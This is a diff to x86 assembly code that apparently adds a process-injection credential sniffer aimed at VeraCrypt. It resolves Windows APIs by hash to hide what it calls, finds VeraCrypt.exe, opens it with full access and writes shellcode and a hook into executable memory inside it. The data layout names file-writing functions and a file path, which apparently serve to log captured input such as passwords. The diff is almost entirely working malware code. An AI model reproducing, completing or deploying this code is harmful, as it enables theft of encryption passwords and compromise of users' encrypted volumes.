@@ -512,6 +512,56 @@ populate_func_addrs:
 
         mov [esi + data + 16], eax              ; CloseHandle addr
 
+        ; OpenProcess
+        push 0x24d26                            ; hash
+        push dword [esi + data]                 ; kernel32
+        call get_proc_address_by_hash
+
+        cmp eax, 0
+        je .shutdown
+
+        mov [esi + data + 20], eax              ; OpenProcess addr
+
+        ; VirtualAllocEx
+        push 0x2cbc6                            ; hash
+        push dword [esi + data]                 ; kernel32
+        call get_proc_address_by_hash
+
+        cmp eax, 0
+        je .shutdown
+
+        mov [esi + data + 24], eax              ; VirtualAllocEx addr
+
+        ; WriteProcessMemory
+        push 0x39cca                            ; hash
+        push dword [esi + data]                 ; kernel32
+        call get_proc_address_by_hash
+
+        cmp eax, 0
+        je .shutdown
+
+        mov [esi + data + 28], eax              ; WriteProcessMemory addr
+
+        ; ResumeThread
+        push 0x25b70                            ; hash
+        push dword [esi + data]                 ; kernel32
+        call get_proc_address_by_hash
+
+        cmp eax, 0
+        je .shutdown
+
+        mov [esi + data + 32], eax              ; ResumeThread addr
+
+        ; VirtualFreeEx
+        push 0x2fa2e                            ; hash
+        push dword [esi + data]                 ; kernel32
+        call get_proc_address_by_hash
+
+        cmp eax, 0
+        je .shutdown
+
+        mov [esi + data + 36], eax              ; VirtualFreeEx addr
+
     .shutdown:
         leave
         ret
@@ -519,6 +569,13 @@ populate_func_addrs:
 main:
         push ebp
         mov ebp, esp
+
+        ; ebp - 4 = return value
+        ; ebp - 8 = target pid
+        ; ebp - 12 = target hnd
+        ; ebp - 16 = sniff mem
+        ; ebp - 20 = sniff hooked func mem
+        sub esp, 20                         ; local variable space
 
         call utils_get_kernel_module_handle
 
@@ -529,15 +586,133 @@ main:
 
         call populate_func_addrs
         
-        int3
+        ; find VeraCrypt
         mov ecx, 0x2c44e                    ; VeraCrypt.exe hash
         push ecx
         call utils_find_target_pid_by_hash
 
+        cmp eax, 0
+        je .shutdown
+
+        mov [ebp - 8], eax                  ; target pid
+
+        ; open hnd to target proc
+        push dword [ebp - 8]                ; target pid
+        push dword 0
+        push dword 0x1fFFFF                 ; PROCESS_ALL_ACCESS
+        call [esi + data + 20]              ; openProcess
+
+        cmp eax, 0
+        je .shutdown
+
+        mov [ebp - 12], eax                 ; target hnd
+
+        ; alloc mem for sniff and data
+        push dword 0x40                     ; PAGE_EXECUTE_READWRITE
+        push dword 0x3000                   ; MEM_RESERVE | MEM_COMMIT
+        mov ecx, sniff_x64.len
+        add ecx, [esi + data + 40]          ; sniff data size
+        push ecx
+        push dword 0
+        push dword [ebp - 12]               ; target hnd
+        call [esi + data + 24]              ; virtualAllocEx
+
+        cmp eax, 0
+        je .shutdown
+
+        mov [ebp - 16], eax                 ; sniff mem
+
+        ; write sniff
+        push dword 0
+        push sniff_x64.len
+        mov eax, esi
+        add eax, sniff_x64
+        push eax
+        push dword [ebp - 16]               ; sniff mem
+        push dword [ebp - 12]               ; target hnd
+        call [esi + data + 28]              ; writeProcessMemory
+
+        cmp eax, 0
+        je .shutdown
+
+        ; write sniff data
+        push dword 0
+        push dword [esi + data + 40]        ; sniff data size
+        mov edx, esi
+        add edx, data
+        add edx, 44                         ; sniff data esi + data + 44
+        push edx                            ; sniff data
+        mov ecx, [ebp - 16]                 ; sniff mem
+        add ecx, sniff_x64.len
+        push ecx
+        push dword [ebp - 12]               ; target hnd
+        call [esi + data + 28]              ; writeProcessMemory
+
+        cmp eax, 0
+        je .shutdown
+
+    int3
+        ; alloc mem sniff hooked func and data
+        push dword 0x40                     ; PAGE_EXECUTE_READWRITE
+        push dword 0x3000                   ; MEM_RESERVE | MEM_COMMIT
+        mov ecx, sniff_hooked_func_x64.len
+        add ecx, 292                        ; sniff hooked func data size
+        push ecx
+        push dword 0
+        push dword [ebp - 12]               ; target hnd
+        call [esi + data + 24]              ; virtualAllocEx
+
+        cmp eax, 0
+        je .shutdown
+
+        mov [ebp - 20], eax                 ; sniff hooked func mem
+        mov [esi + data + 84], eax          ; hooked mem addr
+
+        ; write sniff hooked func
+        push dword 0
+        push dword sniff_hooked_func_x64.len
+        mov ecx, esi
+        add ecx, sniff_hooked_func_x64
+        push ecx
+        push dword [ebp - 20]               ; sniff hooked func mem
+        push dword [ebp - 12]               ; target hnd
+        call [esi + data + 28]              ; writeProcessMemory
+
+        cmp eax, 0
+        je .shutdown
+
+        ; write sniff hooked func data
+        push dword 0
+        push dword 292                      ; sniff hooked func data size
+        mov edx, esi
+        add edx, data
+        add edx, 92                         ; sniff hooked func data
+        push edx
+        mov eax, [ebp - 20]                 ; sniff hooked func mem
+        add eax, sniff_hooked_func_x64.len
+        push eax
+        push dword [ebp - 12]               ; target hnd
+        call [esi + data + 28]              ; writeProcessMemory
+
+        cmp eax, 0
+        je .shutdown
+
     .shutdown:
+        push dword 0x8000                   ; MEM_RELEASE
+        push dword 0
+        push dword [ebp - 16]               ; sniff mem
+        push dword [ebp - 12]               ; target hnd
+        call [esi + data + 36]              ; virtualFreeEx
+        
+        push dword [ebp - 8]                ; target pid
+        call [esi + data + 16]              ; closeHandle
+
         leave
         pop esi
         ret
+
+%include 'sniff.x64.bin.asm'
+%include 'sniff_hooked_func.x64.bin.asm'
 
 align 16
 data:
@@ -546,3 +721,24 @@ data:
 ; process32First            8
 ; process32Next             12
 ; closeHandle               16
+; openProcess               20
+; virtualAllocEx            24
+; writeProcessMemory        28
+; resumeThread              32
+; virtualFreeEx             36
+; sniff data size           40
+
+; sniff data
+; getModuleHandleA              44
+; loadLibraryA                  52
+; imageDirectoryEntryToDataEx   60
+; virtualProtect                68
+; funcAddrPage                  76
+; hookedFuncMem                 84
+
+; sniff hooked func data
+; wideCharToMultiByte           92
+; createFile                    100
+; writeFile                     108
+; closeHandle                   116
+; filePath                      124
